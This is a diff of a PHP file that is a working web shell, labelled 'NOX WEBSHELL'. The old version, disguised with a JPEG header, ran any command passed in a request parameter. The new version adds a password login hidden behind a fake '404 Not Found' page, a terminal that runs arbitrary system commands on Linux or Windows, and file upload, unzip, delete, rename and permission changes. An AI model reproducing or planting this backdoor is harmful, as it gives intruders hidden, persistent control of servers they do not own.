@@ -1,17 +1,83 @@
-���� JFIF      ��
 <?php
+session_start();
+
+$hashed_password = '$2y$10$cLR7dHkVrRLv4PEJmZvou.gSz6o7zKqAQcxuP96oH8xqslhNfKAWq';
+
+if (!isset($_SESSION['logged_in'])) {
+    if (isset($_POST['submit_password'])) {
+        if (password_verify($_POST['password'], $hashed_password)) {
+            $_SESSION['logged_in'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit();
+        } else {
+            $error = "Password salah!";
+        }
+    }
+    
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>404 Not Found</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+        <style>
+            body { 
+                background-color: #343a40;
+                color: white;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+            }
+            .login-container {
+                background-color: #495057;
+                padding: 20px;
+                border-radius: 10px;
+                width: 300px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-container">
+            <h2 class="text-center mb-4">NOX WEBSHELL</h2>
+            <?php if (isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
+            <form method="post">
+                <div class="form-group">
+                    <input type="password" name="password" class="form-control" placeholder="Enter password" required>
+                </div>
+                <button type="submit" name="submit_password" class="btn btn-primary btn-block">Login</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit();
+}
 
 function executeCommand($input) {
+    // Deteksi sistem operasi
+    $isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
+    
+    // Jika command adalah 'ls' dan sistem operasi Windows, ganti dengan 'dir'
+    if ($isWindows && trim($input) === 'ls') {
+        $input = 'dir';
+    }
+
     $descriptors = array(
         0 => array("pipe", "r"),
         1 => array("pipe", "w"),
-        2 => array("pipe", "w") 
+        2 => array("pipe", "w")
     );
 
-    $process = proc_open($input, $descriptors, $pipes);
+    // Untuk Windows, gunakan cmd.exe
+    if ($isWindows) {
+        $process = proc_open('cmd /c ' . $input, $descriptors, $pipes);
+    } else {
+        $process = proc_open($input, $descriptors, $pipes);
+    }
 
     if (is_resource($process)) {
-      
         $output = stream_get_contents($pipes[1]);
         $errorOutput = stream_get_contents($pipes[2]);
 
@@ -19,7 +85,6 @@ function executeCommand($input) {
         fclose($pipes[1]);
         fclose($pipes[2]);
 
-        
         $exitCode = proc_close($process);
 
         if ($exitCode === 0) {
@@ -32,9 +97,24 @@ function executeCommand($input) {
     }
 }
 
-if (isset($_REQUEST['c'])) {
-    $command = $_REQUEST['c'];
-    echo executeCommand($command);
+// Dan perbaiki bagian untuk menangani output terminal
+if (isset($_POST['command'])) {
+    $command = $_POST['command'];
+    $output = executeCommand($command);
+    // Tampilkan output dalam format yang mudah dibaca
+}
+
+// Fungsi untuk mengextract file
+function unzip_file($zipfile) {
+    $zip = new ZipArchive;
+    $destination = dirname($zipfile); // mengambil direktori dimana file zip berada
+    if ($zip->open($zipfile) === TRUE) {
+        $zip->extractTo($destination);
+        $zip->close();
+        echo '<div class="alert alert-success">File berhasil di-unzip ke: ' . $destination . '</div>';
+    } else {
+        echo '<div class="alert alert-danger">Gagal membuka file zip</div>';
+    }
 }
 
 // Fungsi untuk menghapus file
@@ -48,22 +128,59 @@ function delete_file($file) {
 }
 
 // Fungsi untuk membuat folder
-function create_folder($folder_name) {
-    if (!file_exists($folder_name)) {
-        mkdir($folder_name);
-        echo '<div class="alert alert-success">Folder berhasil dibuat: ' . $folder_name . '</div>';
+function display_create_folder_form() {
+    echo '<form method="post" class="mb-4">';
+    echo '<div class="form-group">';
+    echo '<label for="folder_name">Create new folder:</label>';
+    echo '<input type="text" name="folder_name" class="form-control" id="folder_name" required>';
+    echo '</div>';
+    echo '<button type="submit" name="create_folder" class="btn btn-success">Create Folder</button>';
+    echo '</form>';
+}
+
+function create_folder($folder_path) {
+    if (!file_exists($folder_path)) {
+        if (mkdir($folder_path)) {
+            echo '<div class="alert alert-success">Folder berhasil dibuat: ' . $folder_path . '</div>';
+        } else {
+            echo '<div class="alert alert-danger">Gagal membuat folder: ' . $folder_path . '</div>';
+        }
     } else {
-        echo '<div class="alert alert-warning">Folder sudah ada: ' . $folder_name . '</div>';
+        echo '<div class="alert alert-warning">Folder sudah ada: ' . $folder_path . '</div>';
     }
 }
 
+// Fungsi untuk mengupload file
+function display_upload_form() {
+    echo '<form method="post" enctype="multipart/form-data" class="mb-4">';
+    echo '<div class="form-group">';
+    echo '<label for="file">Upload file:</label>';
+    echo '<input type="file" name="file" class="form-control" id="file">';
+    echo '</div>';
+    echo '<button type="submit" name="submit" class="btn btn-primary">Upload</button>';
+    echo '</form>';
+}
+
 // Fungsi untuk membuat file baru
-function create_file($file_name, $content) {
-    if (!file_exists($file_name)) {
-        file_put_contents($file_name, $content);
-        echo '<div class="alert alert-success">File berhasil dibuat: ' . $file_name . '</div>';
+function display_create_file_form() {
+    echo '<form method="post" class="mb-4">';
+    echo '<div class="form-group">';
+    echo '<label for="file_name">Create new file:</label>';
+    echo '<input type="text" name="file_name" class="form-control" id="file_name" required>';
+    echo '</div>';
+    echo '<div class="form-group">';
+    echo '<label for="file_content">Content:</label>';
+    echo '<textarea name="file_content" class="form-control" id="file_content"></textarea>';
+    echo '</div>';
+    echo '<button type="submit" name="create_file" class="btn btn-info">Create File</button>';
+    echo '</form>';
+}
+
+function create_file($file_path, $content) {
+    if (file_put_contents($file_path, $content) !== false) {
+        echo '<div class="alert alert-success">File berhasil dibuat: ' . $file_path . '</div>';
     } else {
-        echo '<div class="alert alert-warning">File sudah ada: ' . $file_name . '</div>';
+        echo '<div class="alert alert-danger">Gagal membuat file: ' . $file_path . '</div>';
     }
 }
 
@@ -151,6 +268,10 @@ if (isset($_POST['submit'])) {
     move_uploaded_file($file_tmp, $dir . '/' . $file_name);
 }
 
+if (isset($_POST['unzip'])) {
+    unzip_file($dir . '/' . $_POST['zip_file']);
+}
+
 if (isset($_POST['create_folder'])) {
     create_folder($dir . '/' . $_POST['folder_name']);
 }
@@ -211,8 +332,9 @@ function display_path_links($path) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>File Manager | Akmal archtte id</title>
+    <title>404 Not Found</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <style>
         body {
             background-color: #343a40;
@@ -254,45 +376,71 @@ function display_path_links($path) {
             display: flex;
             align-items: center;
         }
+        .file-actions form {
+        display: inline-block;
+        }
+        .file-actions .btn {
+            padding: .25rem .5rem;
+        }
+        .file-actions .form-control-sm {
+            height: calc(1.5em + .5rem + 2px);
+            padding: .25rem .5rem;
+            font-size: .875rem;
+            line-height: 1.5;
+            border-radius: .2rem;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="text-center">File Manager</h1>
+        <h1 class="text-center mb-4">File Manager</h1>
         <h3>Current Path:</h3>
         <div class="mb-3">
             <?php display_path_links(realpath($dir)); ?>
         </div>
 
-        <form method="post" enctype="multipart/form-data">
-            <div class="form-group">
-                <label for="file">Upload file:</label>
-                <input type="file" name="file" class="form-control" id="file">
-            </div>
-            <button type="submit" name="submit" class="btn btn-primary">Upload</button>
-        </form>
+        <div class="text-center mb-4">
+            <a href="?action=upload" class="btn btn-primary btn-sm mx-2" title="Upload File">
+                <i class="fas fa-upload"></i> Upload
+            </a>
+            <a href="?action=create_folder" class="btn btn-success btn-sm mx-2" title="Create New Folder">
+                <i class="fas fa-folder-plus"></i> New Folder
+            </a>
+            <a href="?action=create_file" class="btn btn-info btn-sm mx-2" title="Create New File">
+                <i class="fas fa-file-medical"></i> New File
+            </a>
+        </div>
 
-        <form method="post">
-            <div class="form-group">
-                <label for="folder_name">Create new folder:</label>
-                <input type="text" name="folder_name" class="form-control" id="folder_name" required>
-            </div>
-            <button type="submit" name="create_folder" class="btn btn-success">Create Folder</button>
-        </form>
-
-        <form method="post">
-            <div class="form-group">
-                <label for="file_name">Create new file:</label>
-                <input type="text" name="file_name" class="form-control" id="file_name" required>
-            </div>
-            <div class="form-group">
-                <label for="file_content">Content:</label>
-                <textarea name="file_content" class="form-control" id="file_content"></textarea>
-            </div>
-            <button type="submit" name="create_file" class="btn btn-success">Create File</button>
-        </form>
+        <?php
+        if (isset($_GET['action'])) {
+            switch ($_GET['action']) {
+                case 'upload':
+                    display_upload_form();
+                    break;
+                case 'create_folder':
+                    display_create_folder_form();
+                    break;
+                case 'create_file':
+                    display_create_file_form();
+                    break;
+            }
+        }
+        ?>
 
         <hr>
+
+        <h3>Terminal:</h3>
+        <form method="post">
+            <div class="form-group">
+                <label for="command">Command:</label>
+                <input type="text" name="command" class="form-control" id="command" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Execute</button>
+        </form>
+
+        <?php if (!empty($output)): ?>
+            <pre class="mt-3 p-3 bg-dark text-light"><?php echo htmlspecialchars($output); ?></pre>
+        <?php endif; ?>
 
         <h3>Files and Folders:</h3>
         <ul class="list-group">
@@ -313,7 +461,7 @@ function display_path_links($path) {
                     echo '<form method="post" class="form-inline ml-2">';
                     echo '<input type="hidden" name="folder_name" value="' . $file . '">';
                     echo '<input type="text" name="new_name" class="form-control" placeholder="New name" required>';
-                    echo '<button type="submit" name="rename_folder" class="btn btn-warning ml-1">Rename</button>';
+                    echo '<button type="submit" name="rename_folder" class="btn btn-warning btn-sm ml-1" title="Rename"><i class="fas fa-edit"></i></button>';
                     echo '</form>';
                     echo '</div>';
                     echo '</li>';
@@ -324,16 +472,25 @@ function display_path_links($path) {
                     echo '<a href="?path=' . urlencode($dir) . '&download=' . urlencode($file) . '">' . $file . '</a>';
                     echo '</div>';
                     echo '<div class="file-actions">';
-                    echo '<a href="?path=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="btn btn-danger btn-sm ml-2">Delete</a>';
-                    echo '<form method="post" class="form-inline ml-2">';
+                    echo '<a href="?path=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="btn btn-danger btn-sm ml-2" title="Delete"><i class="fas fa-trash"></i></a>';
+                    
+                    if (pathinfo($file, PATHINFO_EXTENSION) === 'zip') {
+                        echo '<form method="post" class="form-inline ml-2" style="display:inline;">';
+                        echo '<input type="hidden" name="zip_file" value="' . $file . '">';
+                        echo '<button type="submit" name="unzip" class="btn btn-primary btn-sm" title="Unzip"><i class="fas fa-file-archive"></i></button>';
+                        echo '</form>';
+                    }
+                    
+                    echo '<form method="post" class="form-inline ml-2" style="display:inline;">';
                     echo '<input type="hidden" name="file_name" value="' . $file . '">';
-                    echo '<input type="text" name="new_name" class="form-control" placeholder="New name" required>';
-                    echo '<button type="submit" name="rename_file" class="btn btn-warning ml-1">Rename</button>';
+                    echo '<input type="text" name="new_name" class="form-control form-control-sm" placeholder="New name" required style="width: 100px;">';
+                    echo '<button type="submit" name="rename_file" class="btn btn-warning btn-sm ml-1" title="Rename"><i class="fas fa-edit"></i></button>';
                     echo '</form>';
-                    echo '<form method="post" class="form-inline ml-2">';
+                    
+                    echo '<form method="post" class="form-inline ml-2" style="display:inline;">';
                     echo '<input type="hidden" name="file_name" value="' . $file . '">';
-                    echo '<input type="text" name="permissions" class="form-control" placeholder="Permissions" required>';
-                    echo '<button type="submit" name="change_permissions" class="btn btn-info ml-1">Change Permissions</button>';
+                    echo '<input type="text" name="permissions" class="form-control form-control-sm" placeholder="Permissions" required style="width: 100px;">';
+                    echo '<button type="submit" name="change_permissions" class="btn btn-info btn-sm ml-1" title="Change Permissions"><i class="fas fa-key"></i></button>';
                     echo '</form>';
                     echo '</div>';
                     echo '</li>';
